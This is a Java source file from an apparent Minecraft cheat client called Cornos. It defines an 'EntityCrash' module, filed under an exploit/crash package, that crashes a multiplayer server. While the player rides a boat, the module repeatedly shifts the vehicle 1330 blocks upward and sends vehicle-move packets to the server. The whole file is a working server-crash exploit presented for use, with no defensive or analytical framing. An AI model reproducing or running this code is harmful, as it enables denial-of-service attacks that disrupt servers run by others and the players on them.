/*
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
# Project: Cornos
# File: EntityCrash
# Created by constantin at 07:19, MÃ¤r 18 2021
PLEASE READ THE COPYRIGHT NOTICE IN THE PROJECT ROOT, IF EXISTENT
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
*/
package me.constantindev.ccl.module.EXPLOIT.CRASH;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.etc.base.Module;
import me.constantindev.ccl.etc.helper.STL;
import me.constantindev.ccl.etc.ms.ModuleType;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;

public class EntityCrash extends Module {
    public EntityCrash() {
        super("EntityCrash", "crashes a server with riding smthing", ModuleType.CRASH);
    }

    @Override
    public void onExecute() {
        assert Cornos.minecraft.player != null;
        Entity e = Cornos.minecraft.player.getVehicle();
        if (!(e instanceof BoatEntity)) {
            STL.notifyUser("You gotta be on something smh");
            this.setEnabled(false);
            return;
        }
        for (int i = 0; i < 38; i++) {
            Vec3d v = e.getPos();
            e.setPos(v.x, v.y + 1330.0, v.z);
            VehicleMoveC2SPacket p = new VehicleMoveC2SPacket(e);
            Objects.requireNonNull(Cornos.minecraft.getNetworkHandler()).sendPacket(p);
        }
        super.onExecute();
    }
}
